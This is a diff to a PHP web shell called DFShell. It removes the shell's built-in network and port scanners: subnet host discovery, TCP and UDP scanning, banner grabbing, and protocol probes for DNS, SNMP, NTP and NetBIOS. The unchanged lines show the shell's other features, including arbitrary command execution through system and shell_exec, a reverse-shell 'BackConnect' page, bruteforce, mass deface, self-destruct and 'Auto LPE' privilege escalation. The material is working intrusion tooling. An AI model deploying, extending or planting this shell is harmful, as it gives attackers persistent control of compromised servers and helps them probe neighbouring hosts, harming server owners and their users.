@@ -13,7 +13,7 @@ $DFSyntax = array("file_get_contents","fileperms","readfile","chdir","getcwd","f
 $DFSCmd = array("system","shell_exec","exec","passthru","proc_open");
 $DFSPlatform = strtolower(substr(PHP_OS,0,3));
 $DFSOptions = array("edit","cmd","del","sql","conf","sym","reverse","crack","mass","logout","dest","ren","chmd","unzip","bombing",
-"netscan","portscan","search","copy","move","info","phpinfo","lpe");
+"search","copy","move","info","phpinfo","lpe");
 
 #new update will use chdir(); function
 #readlink("symlink_file"),lchgrp(symlink_file, uid),lchown(symlink_file, 8) function
@@ -114,141 +114,6 @@ class DFShell{
     }
 
     // v2.3: guess local /24 base, e.g. 192.168.1.
-    public function DFSLocalBase(){
-        $ip = @gethostbyname(@gethostname());
-        if(!filter_var($ip,FILTER_VALIDATE_IP,FILTER_FLAG_IPV4)){ $ip = $_SERVER['SERVER_ADDR'] ?? '127.0.0.1'; }
-        if(!filter_var($ip,FILTER_VALIDATE_IP,FILTER_FLAG_IPV4)){ $ip = '192.168.1.1'; }
-        $parts = explode('.',$ip);
-        return $parts[0].'.'.$parts[1].'.'.$parts[2].'.';
-    }
-
-    // v2.3: expand "21,22,80-85,443" -> int[] (capped)
-    public function DFSParsePorts($raw,$max=2000){
-        $raw = trim((string)$raw);
-        if($raw===""){ return array(); }
-        $out = array();
-        foreach(preg_split('/[\s,;]+/',$raw) as $tok){
-            if(strpos($tok,'-')!==false){
-                list($a,$b) = array_map('intval',explode('-',$tok,2));
-                if($a<1){$a=1;} if($b>65535){$b=65535;}
-                if($a>$b){ $t=$a;$a=$b;$b=$t; }
-                for($p=$a;$p<=$b && count($out)<$max;$p++){ $out[]=$p; }
-            }else{
-                $p=intval($tok);
-                if($p>=1&&$p<=65535){ $out[]=$p; }
-                if(count($out)>=$max){ break; }
-            }
-        }
-        return array_values(array_unique($out));
-    }
-
-    public function DFSPortService($port){
-        static $map = array(7=>'Echo',19=>'Chargen',21=>'FTP',22=>'SSH',23=>'Telnet',25=>'SMTP',53=>'DNS',
-        67=>'DHCP-srv',68=>'DHCP-cli',69=>'TFTP',80=>'HTTP',110=>'POP3',111=>'RPCbind',123=>'NTP',
-        135=>'MSRPC',137=>'NetBIOS-ns',138=>'NetBIOS-dgm',139=>'NetBIOS',143=>'IMAP',161=>'SNMP',162=>'SNMP-trap',
-        389=>'LDAP',443=>'HTTPS',445=>'SMB',500=>'IKE',514=>'Syslog',520=>'RIP',623=>'IPMI',636=>'LDAPS',
-        1433=>'MSSQL',1521=>'Oracle',1900=>'SSDP',3306=>'MySQL',3389=>'RDP',4500=>'IPsec-NAT',5353=>'mDNS',
-        5432=>'PostgreSQL',5900=>'VNC',6379=>'Redis',8080=>'HTTP-Alt',8443=>'HTTPS-Alt',
-        11211=>'Memcached',27017=>'MongoDB');
-        return $map[$port] ?? '';
-    }
-
-    // v2.6: active service fingerprinting — send a protocol probe, match the reply
-    public function DFSFingerprint($host,$port,$banner='',$proto='tcp'){
-        $b = strtolower((string)$banner);
-        // fast path: banner already tells us
-        $hints = array('ssh-'=>'SSH','220 '=>'FTP/SMTP','smtp'=>'SMTP','esmtp'=>'SMTP','ftp'=>'FTP',
-            'imap'=>'IMAP','pop3'=>'POP3','http'=>'HTTP','server:'=>'HTTP','mysql'=>'MySQL',
-            'redis'=>'Redis','memcached'=>'Memcached','microsoft'=>'SMB/RDP','rdp'=>'RDP','vnc'=>'VNC');
-        foreach($hints as $k=>$v){ if($b!=="" && strpos($b,$k)!==false){ return $v; } }
-
-        // active probes per port (TCP only — cheap, one shot each)
-        $probes = array();
-        if($proto==='tcp'){
-            if(in_array($port,array(80,8080,8000,8888,8443,443,3128,8008))){
-                $probes[] = "HEAD / HTTP/1.0\r\nHost: $host\r\n\r\n";
-            }elseif($port==25 || $port==587){
-                $probes[] = "EHLO dfs\r\n";
-            }elseif($port==21){
-                $probes[] = "FEAT\r\n";
-            }elseif($port==110){
-                $probes[] = "CAPA\r\n";
-            }elseif($port==143){
-                $probes[] = "A001 CAPABILITY\r\n";
-            }elseif($port==6379){
-                $probes[] = "*1\r\n\$4\r\nPING\r\n";
-            }elseif($port==11211){
-                $probes[] = "version\r\n";
-            }elseif($port==3306 || $port==5432 || $port==1433 || $port==1521 || $port==27017){
-                $probes[] = "\r\n"; // these usually banner on connect already
-            }else{
-                $probes[] = "HEAD / HTTP/1.0\r\n\r\n"; // generic: catches HTTP on odd ports
-            }
-        }
-        foreach((array)$probes as $pb){
-            $fp = @$GLOBALS['DFSyntax'][6]($host,$port,$errno,$errstr,1.5);
-            if(!$fp){ continue; }
-            @stream_set_timeout($fp,2);
-            @fwrite($fp,$pb);
-            $resp = (string)@fread($fp,1024);
-            @fclose($fp);
-            $resp = trim(preg_replace('/[\r\n\t]+/',' | ',$resp));
-            if($resp===""){ continue; }
-            $rl = strtolower($resp);
-            if(strpos($rl,'ssh-')!==false){ return 'SSH ('.substr($resp,0,60).')'; }
-            if(strpos($rl,'http/')!==false || strpos($rl,'server:')!==false){ return 'HTTP ('.substr($resp,0,80).')'; }
-            if(strpos($rl,'220')!==false && strpos($rl,'smtp')!==false){ return 'SMTP ('.substr($resp,0,60).')'; }
-            if(strpos($rl,'220')!==false){ return 'FTP ('.substr($resp,0,60).')'; }
-            if(strpos($rl,'+ok')!==false){ return 'POP3 ('.substr($resp,0,60).')'; }
-            if(strpos($rl,'* capability')!==false || strpos($rl,'imap')!==false){ return 'IMAP ('.substr($resp,0,60).')'; }
-            if(strpos($rl,'+pong')!==false || strpos($rl,'redis')!==false){ return 'Redis'; }
-            if(strpos($rl,'version')!==false && strlen($resp)<40){ return 'Memcached ('.$resp.')'; }
-            return substr($resp,0,80);
-        }
-        return '';
-    }
-
-    // v2.6: UDP scan via udp:// sockets + protocol probes (DNS, SNMP, NTP, NetBIOS)
-    public function DFSUdpScan($host,$ports,$timeout=1.5){
-        $host = trim($host);
-        $timeout = max(0.5,min(4.0,floatval($timeout)));
-        $open = array(); $closed = 0;
-        @set_time_limit(0);
-        // canned probes: DNS status request, SNMPv1 public get, NTP client req, NetBIOS name query
-        $dnsProbe  = "\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\x01\x00\x01";
-        $snmpProbe = "\x30\x26\x02\x01\x00\x04\x06\x70\x75\x62\x6c\x69\x63\xa0\x19\x02\x04\x71\x5e\x46\x08\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00";
-        $ntpProbe  = "\x1b".str_repeat("\x00",47);
-        $nbProbe   = "\xa2\xa2\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x20\x43\x4b\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x00\x00\x21\x00\x01";
-        foreach((array)$ports as $port){
-            $port = intval($port);
-            $t0 = microtime(true);
-            $probe = "";
-            if($port==53){ $probe = $dnsProbe; }
-            elseif($port==161 || $port==162){ $probe = $snmpProbe; }
-            elseif($port==123){ $probe = $ntpProbe; }
-            elseif($port==137){ $probe = $nbProbe; }
-            $fp = @fsockopen("udp://".$host,$port,$errno,$errstr,$timeout);
-            if(!$fp){ $closed++; continue; }
-            @stream_set_timeout($fp,(int)ceil($timeout));
-            if($probe!==""){ @fwrite($fp,$probe); }
-            else{ @fwrite($fp,"\r\n"); }
-            $resp = (string)@fread($fp,1024);
-            $ms = round((microtime(true)-$t0)*1000);
-            @fclose($fp);
-            $resp = trim($resp);
-            if($resp!==""){
-                $fp2 = 'open (reply '.strlen($resp).'B)';
-                $svc = $this->DFSPortService($port);
-                $open[] = array('port'=>$port,'service'=>$svc,'ms'=>$ms,'banner'=>$fp2,'proto'=>'udp');
-            }else{
-                // UDP is connectionless: no reply = open|filtered, count separately
-                $svc = $this->DFSPortService($port);
-                $open[] = array('port'=>$port,'service'=>$svc,'ms'=>$ms,'banner'=>'no reply (open|filtered)','proto'=>'udp');
-            }
-        }
-        return array('host'=>$host,'open'=>$open,'closed'=>$closed,'total'=>count($ports));
-    }
-
     public function DFSPopupMSG($no,$title,$msg,$foot,$x){
         if($x){
             $location = "window.location.replace(window.location.href)";
@@ -541,69 +406,7 @@ class DFShell{
 
 ####### END REVERSHELL ########
 
-    // ===== v2.3: NETWORK SCANNERS =====
-    // Fast TCP-based live-host discovery across a /24 (no raw ICMP needed).
-    public function DFSNetScan($base,$timeout=0.4,$probePorts=array(80,443,22,445)){
-        $base = trim($base);
-        if(!preg_match('/^\d{1,3}\.\d{1,3}\.\d{1,3}\.$/',$base)){
-            // accept "192.168.1.0/24" or "192.168.1" -> normalise to "192.168.1."
-            $base = preg_replace('/\/24$/','',$base);
-            $base = rtrim($base,'.');
-            $parts = explode('.',$base);
-            while(count($parts)<3){ $parts[]='0'; }
-            $base = $parts[0].'.'.$parts[1].'.'.$parts[2].'.';
-        }
-        $timeout = max(0.15,min(2.0,floatval($timeout)));
-        $live = array();
-        @set_time_limit(0);
-        for($i=1;$i<255;$i++){
-            $ip = $base.$i;
-            foreach((array)$probePorts as $pp){
-                $pp = intval($pp);
-                $t0 = microtime(true);
-                $fp = @$GLOBALS['DFSyntax'][6]($ip,$pp,$errno,$errstr,$timeout);
-                if($fp){
-                    @fclose($fp);
-                    $ms = round((microtime(true)-$t0)*1000);
-                    $live[] = array('ip'=>$ip,'port'=>$pp,'ms'=>$ms,'host'=>@gethostbyaddr($ip));
-                    break;
-                }
-            }
-        }
-        return array('base'=>$base,'live'=>$live);
-    }
 
-    // v2.3: TCP connect port scan + banner grab (v2.6: + fingerprinting)
-    public function DFSPortScan($host,$ports,$timeout=0.5,$grabBanner=true,$fingerprint=false){
-        $host = trim($host);
-        $timeout = max(0.15,min(3.0,floatval($timeout)));
-        $open = array(); $closed = 0;
-        @set_time_limit(0);
-        foreach((array)$ports as $port){
-            $port = intval($port);
-            $t0 = microtime(true);
-            $fp = @$GLOBALS['DFSyntax'][6]($host,$port,$errno,$errstr,$timeout);
-            if($fp){
-                $ms = round((microtime(true)-$t0)*1000);
-                $banner = '';
-                if($grabBanner){
-                    @stream_set_timeout($fp,1);
-                    @fwrite($fp,"\r\n");
-                    $banner = @fread($fp,1024);
-                    $banner = trim(preg_replace('/[\r\n\t]+/',' | ',(string)$banner));
-                    if(strlen($banner)>180){ $banner = substr($banner,0,180).'...'; }
-                }
-                @fclose($fp);
-                $fpnt = '';
-                if($fingerprint){
-                    $fpnt = $this->DFSFingerprint($host,$port,$banner,'tcp');
-                    if($fpnt!=="" && $banner===""){ $banner = $fpnt; $fpnt = ''; }
-                }
-                $open[] = array('port'=>$port,'service'=>$this->DFSPortService($port),'ms'=>$ms,'banner'=>$banner,'fp'=>$fpnt,'proto'=>'tcp');
-            }else{ $closed++; }
-        }
-        return array('host'=>$host,'open'=>$open,'closed'=>$closed,'total'=>count($ports));
-    }
 
     public function DFSAction($action){
         switch(strtolower($action)){
@@ -1114,7 +917,7 @@ class DFShell{
                 }
                 echo "</textarea><br><input type='text' name='dfscmd' placeholder='whoami' value='".$this->DFSH($lastCmd)."'><br><button>Execute</button></form>";
                 echo "</details>";
-                echo "<p style='color:#666;font-size:12px'>Tip: new in v2.6 — ajax terminal above runs without reload. Try <b>?dfaction=netscan</b> and <b>?dfaction=portscan</b> for recon without shell.</p>";
+                echo "<p style='color:#666;font-size:12px'>Tip: new in v2.6 — ajax terminal above runs without reload.</p>";
                 echo "</section>";
             break;
             case "sym":
@@ -1732,78 +1535,7 @@ class DFShell{
                 }
                 echo "</section>";
             break;
-            case "netscan":
-                $defBase = $this->DFSLocalBase();
-                echo "<section class='netscan'><h3>Local Network IP Scanner <small style='color:#888'>(v2.3)</small></h3>";
-                echo "<form action='' method='POST'><table>";
-                echo "<tr><td><label>Subnet base : </label></td><td><input type='text' name='netsubnet' value='".$this->DFSH($_POST['netsubnet'] ?? $defBase)."' placeholder='192.168.1.'></td></tr>";
-                echo "<tr><td><label>Probe ports : </label></td><td><input type='text' name='netports' value='".$this->DFSH($_POST['netports'] ?? '80,443,22,445')."' placeholder='80,443,22'></td></tr>";
-                echo "<tr><td><label>Timeout (s) : </label></td><td><input type='text' name='nettimeout' value='".$this->DFSH($_POST['nettimeout'] ?? '0.4')."'></td></tr>";
-                echo "<tr><td></td><td><input type='submit' name='dfnetscan' value='Scan /24'></td></tr>";
-                echo "</table></form><div class='scanresults'>";
-                if(isset($GLOBALS['DFConfig'][1]['dfnetscan'])){
-                    $pp = $this->DFSParsePorts($GLOBALS['DFConfig'][1]['netports']);
-                    $res = $this->DFSNetScan($GLOBALS['DFConfig'][1]['netsubnet'], $GLOBALS['DFConfig'][1]['nettimeout'], $pp);
-                    echo "<p>Subnet <b>".$this->DFSH($res['base'])."0/24</b> — <b>".count($res['live'])."</b> live host(s)</p>";
-                    if(count($res['live'])){
-                        echo "<table class='scantable'><tr><th>IP</th><th>Open probe</th><th>Latency</th><th>Hostname</th><th>Action</th></tr>";
-                        foreach($res['live'] as $h){
-                            $hip = $this->DFSH($h['ip']);
-                            echo "<tr><td>$hip</td><td>".$h['port']."</td><td>".$h['ms']." ms</td><td>".$this->DFSH($h['host'])."</td>";
-                            echo "<td><a href='?dfaction=portscan&target=$hip'>Port-scan</a></td></tr>";
-                        }
-                        echo "</table>";
-                    }else{
-                        echo "<p style='color:orange'>No live hosts on probe ports. Try different ports / larger timeout.</p>";
-                    }
-                }else{
-                    echo "<p style='color:#aaa'>Auto-detected base: <b>".$this->DFSH($defBase)."0/24</b>. Scans 254 hosts via TCP connect (no root needed).</p>";
-                }
-                echo "</div></section>";
-            break;
-            case "portscan":
-                $defTarget = $GLOBALS['DFConfig'][0]['target'] ?? ($_SERVER['SERVER_ADDR'] ?? '127.0.0.1');
-                echo "<section class='portscan'><h3>Port Scanner <small style='color:#888'>(v2.6 — TCP/UDP + fingerprint)</small></h3>";
-                echo "<form action='' method='POST'><table>";
-                echo "<tr><td><label>Host : </label></td><td><input type='text' name='pshost' value='".$this->DFSH($_POST['pshost'] ?? $defTarget)."' placeholder='127.0.0.1'></td></tr>";
-                echo "<tr><td><label>Ports : </label></td><td><input type='text' name='psports' value='".$this->DFSH($_POST['psports'] ?? '21,22,23,25,53,80,110,143,443,445,3306,3389,8080,8443')."' placeholder='1-1000 or 80,443'></td></tr>";
-                echo "<tr><td><label>Proto : </label></td><td><select name='psproto'><option value='tcp'".(($_POST['psproto'] ?? 'tcp')==='tcp'?' selected':'').">TCP</option><option value='udp'".(($_POST['psproto'] ?? '')==='udp'?' selected':'').">UDP</option><option value='both'".(($_POST['psproto'] ?? '')==='both'?' selected':'').">Both</option></select></td></tr>";
-                echo "<tr><td><label>Timeout : </label></td><td><input type='text' name='pstimeout' value='".$this->DFSH($_POST['pstimeout'] ?? '0.5')."'></td></tr>";
-                echo "<tr><td></td><td><label style='font-size:12px'><input type='checkbox' name='psbanner' value='1'".(isset($_POST['dfportscan']) && !isset($_POST['psbanner']) ? '' : ' checked')."> Banner grab</label> <label style='font-size:12px'><input type='checkbox' name='psfp' value='1'".(isset($_POST['psfp'])?' checked':'')."> Fingerprint</label> <input type='submit' name='dfportscan' value='Scan'></td></tr>";
-                echo "</table></form><div class='scanresults'>";
-                if(isset($GLOBALS['DFConfig'][1]['dfportscan'])){
-                    $ports = $this->DFSParsePorts($GLOBALS['DFConfig'][1]['psports']);
-                    if(empty($ports)){ echo "<p style='color:red'>No valid ports (max 2000, format e.g. 1-1000,8080).</p>"; }
-                    else{
-                        $proto = $GLOBALS['DFConfig'][1]['psproto'] ?? 'tcp';
-                        $doFp = isset($GLOBALS['DFConfig'][1]['psfp']);
-                        $all = array();
-                        if($proto==='tcp' || $proto==='both'){
-                            $res = $this->DFSPortScan($GLOBALS['DFConfig'][1]['pshost'],$ports,$GLOBALS['DFConfig'][1]['pstimeout'],isset($GLOBALS['DFConfig'][1]['psbanner']),$doFp);
-                            $all = array_merge($all,$res['open']);
-                        }
-                        if($proto==='udp' || $proto==='both'){
-                            $ures = $this->DFSUdpScan($GLOBALS['DFConfig'][1]['pshost'],$ports,$GLOBALS['DFConfig'][1]['pstimeout']);
-                            $all = array_merge($all,$ures['open']);
-                        }
-                        echo "<p>Host <b>".$this->DFSH($GLOBALS['DFConfig'][1]['pshost'])."</b> [$proto] — <b>".count($all)."</b>/".count($ports)." open</p>";
-                        if(count($all)){
-                            echo "<table class='scantable'><tr><th>Port</th><th>Proto</th><th>Service</th><th>Latency</th><th>Banner / Fingerprint</th></tr>";
-                            foreach($all as $o){
-                                $pr = $o['proto'] ?? 'tcp';
-                                $extra = $this->DFSH($o['banner']);
-                                if(!empty($o['fp'])){ $extra .= ($extra!==""?" <span style='color:#4d7cff'>| ".$this->DFSH($o['fp'])."</span>":"<span style='color:#4d7cff'>".$this->DFSH($o['fp'])."</span>"); }
-                                echo "<tr><td><b style='color:#69e01f'>".$o['port']."/open</b></td><td>$pr</td><td>".$this->DFSH($o['service'])."</td><td>".$o['ms']." ms</td><td>$extra</td></tr>";
-                            }
-                            echo "</table>";
-                            if($proto==='udp'||$proto==='both'){ echo "<p style='color:#666;font-size:11px'>Note: UDP is connectionless — 'no reply (open|filtered)' means the port didn't refuse, could be open or filtered.</p>"; }
-                        }else{ echo "<p style='color:orange'>All scanned ports closed/filtered.</p>"; }
-                    }
-                }else{
-                    echo "<p style='color:#aaa'>TCP-connect + UDP scan with banner grab and service fingerprinting. Keep ranges &lt; 2000 ports to avoid timeouts.</p>";
-                }
-                echo "</div></section>";
-            break;
+
             case "search":
                 $slashtype = $this->DFSSlash();
                 $basePath = isset($this->query[0]) ? $this->Dec($this->query[0]) : getcwd();
@@ -3644,7 +3376,7 @@ Document Root : ".$this->DFSH($GLOBALS['DFConfig'][2]['DOCUMENT_ROOT'] ?? '')." 
         else{ $contents = $this->DFSFetch(self::$remote_url . "/".$location); }
         if(!isset($contents)||$contents===""||$contents===false){
             // v2.3 local fallback nav (includes new actions)
-            $contents = "<section class=\"bodytop\"><ul><li><a href='%{A1}%'>Directory</a></li><li><a href='%{A2}%'>Config</a></li><li><a href='%{A3}%'>BackConnect</a></li><li><a href='%{A4}%'>Symlink</a></li><li><a href='%{A5}%'>Bruteforce</a></li><li><a href='%{A6}%'>Command</a></li><li><a href='%{A7}%'>Mass</a></li><li><a href='%{A8}%'>Database</a></li><li><a href='%{A9}%'>Destruct</a></li><li><a href='%{A10}%'>Bombing</a></li><li><a href='%{A12}%'>NetScan</a></li><li><a href='%{A13}%'>PortScan</a></li><li><a href='%{A14}%'>Search</a></li><li><a href='%{A15}%'>PHPInfo</a></li><li><a href='%{A16}%'>Auto LPE</a></li><li class='logout'><a href='%{A11}%'>Logout</a></li></ul></section>";
+            $contents = "<section class=\"bodytop\"><ul><li><a href='%{A1}%'>Directory</a></li><li><a href='%{A2}%'>Config</a></li><li><a href='%{A3}%'>BackConnect</a></li><li><a href='%{A4}%'>Symlink</a></li><li><a href='%{A5}%'>Bruteforce</a></li><li><a href='%{A6}%'>Command</a></li><li><a href='%{A7}%'>Mass</a></li><li><a href='%{A8}%'>Database</a></li><li><a href='%{A9}%'>Destruct</a></li><li><a href='%{A10}%'>Bombing</a></li><li><a href='%{A12}%'>Search</a></li><li><a href='%{A13}%'>PHPInfo</a></li><li><a href='%{A14}%'>Auto LPE</a></li><li class='logout'><a href='%{A11}%'>Logout</a></li></ul></section>";
         }
         $from = $this->DFSRender($pattern,$contents,$from);
         return $from;
@@ -3715,7 +3447,7 @@ if(!isset($_SESSION['DFS_Auth']) || empty($_SESSION['DFS_Auth'])){
         $toReplace = array($GLOBALS['DFConfig'][2]['PHP_SELF'],"?dfaction=conf","?dfaction=reverse",
                           "?dfaction=sym","?dfaction=crack",$cmdx,"?dfaction=mass","?dfaction=sql",
                           "?dfaction=dest","?dfaction=bombing","?dfaction=logout",
-                          "?dfaction=netscan","?dfaction=portscan","?dfaction=search","?dfaction=phpinfo","?dfaction=lpe");
+                          "?dfaction=search","?dfaction=phpinfo","?dfaction=lpe");
 
         $contents = $shell->DFSRender("/%{body}%/i","%{DFSI}%",$contents);
         $contents = $shell->DFSRender("/%{DFSI}%/i",$chead,$contents);
